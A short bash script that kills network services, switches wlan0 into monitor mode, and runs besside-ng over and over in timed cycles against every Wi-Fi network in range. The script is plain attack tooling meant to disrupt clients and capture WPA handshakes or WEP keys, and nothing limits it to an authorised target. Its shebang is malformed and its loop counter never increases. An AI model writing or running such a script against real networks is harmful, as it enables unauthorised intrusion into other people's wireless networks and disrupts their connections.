#/bin/bash
airmon-ng check kill
#Kill wifi card blocking programs
/etc/init.d/network-manager stop
sleep 5
/etc/init.d/networking stop
sleep 5
/etc/init.d/avahi-daemon stop
sleep 5
airmon-ng check kill -9
airmon-ng start wlan0

n=1
while [ $n -le 3 ]
 do
	cd /root
	rm besside.log
	besside-ng wlan0mon &
	sleep 300
	killall -15 besside-ng
	sleep 5
	killall -9 besside-ng
	sleep 5
	rm besside.log
	sleep 1800
 done

